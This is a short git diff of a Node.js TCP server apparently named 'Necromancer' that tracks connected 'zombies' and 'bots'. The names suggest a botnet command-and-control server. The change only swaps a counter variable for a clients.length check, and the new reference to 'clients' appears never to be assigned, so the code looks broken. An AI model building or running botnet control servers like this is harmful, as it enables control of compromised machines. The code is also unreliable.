@@ -4,7 +4,6 @@ import dotenv from "dotenv";
 
 dotenv.config({ path: "../config/.env" });
 
-let clientCount = 0;
 let clients, clientInstances, silent;
 
 const clientModules = {
@@ -20,7 +19,7 @@ function setTerminalTitle() {
 	process.stdout.write(
 		String.fromCharCode(27) +
 			"]0;" +
-			`Necromancer | Zombies: ${clientCount}` +
+			`Necromancer | Zombies: ${clients.length}` +
 			String.fromCharCode(7)
 	);
 }
@@ -39,7 +38,6 @@ net.createServer((socket) => {
 
 	// On client connect
 	clientModules.clients.push(socket);
-	clientCount++;
 	clientModules.clientInstances = [...clientModules.clients];
 
 	setTerminalTitle();
@@ -58,10 +56,9 @@ net.createServer((socket) => {
 
 	function clientDisconnected() {
 		clientModules.clients.splice(clientModules.clients.indexOf(socket), 1);
-		clientCount--;
 		clientModules.clientInstances = [...clientModules.clients];
 		console.log(`\x1b[91m\nBot ${socket.name} has disconnected.\x1b[0m`);
-		if (clientCount < 1)
+		if (clients.length < 1)
 			console.log("\x1b[91mWaiting for clients to connect.\x1b[0m");
 		setTerminalTitle();
 	}
